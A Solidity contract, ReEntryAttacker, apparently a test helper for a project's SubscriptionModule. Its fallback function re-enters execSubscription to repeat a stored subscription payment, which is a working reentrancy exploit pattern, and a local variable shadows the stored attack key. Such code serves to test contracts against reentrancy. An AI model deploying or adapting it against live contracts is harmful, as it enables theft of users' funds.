pragma solidity ^0.5.0;

import "./common/Enum.sol";
import "./modules/SubscriptionModule.sol";

contract ReEntryAttacker {

    struct Payload {
        address to;
        uint256 value;
        bytes data;
        Enum.Operation operation;
        uint256 safeTxGas;
        uint256 dataGas;
        uint256 gasPrice;
        address gasToken;
        address payable refundReceiver;
        bytes meta;
        bytes signatures;
    }

    address payable subModule;

    bytes32 activeAttack;

    mapping(bytes32 => Payload) public payloads;

    constructor(
        address payable _subModuleAddr
    )
    public
    {
        subModule = _subModuleAddr;
    }

    function attack(
        address payable to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 dataGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory meta,
        bytes memory signatures
    )
    public
    {
        bytes32 activeAttack = SubscriptionModule(subModule)
        .getSubscriptionHash(
            to,
            value,
            data,
            operation,
            safeTxGas,
            dataGas,
            gasPrice,
            gasToken,
            refundReceiver,
            meta
        );

        payloads[activeAttack] = Payload(
            to,
            value,
            data,
            operation,
            safeTxGas,
            dataGas,
            gasPrice,
            gasToken,
            refundReceiver,
            meta,
            signatures
        );

        SubscriptionModule(subModule)
        .execSubscription(
            to,
            value,
            data,
            operation,
            safeTxGas,
            dataGas,
            gasPrice,
            gasToken,
            refundReceiver,
            meta,
            signatures
        );
    }

    function()
    external
    payable {

        Payload storage attack = payloads[activeAttack];

        SubscriptionModule(subModule)
        .execSubscription(
            attack.to,
            attack.value,
            attack.data,
            attack.operation,
            attack.safeTxGas,
            attack.dataGas,
            attack.gasPrice,
            attack.gasToken,
            attack.refundReceiver,
            attack.meta,
            attack.signatures
        );
    }
}
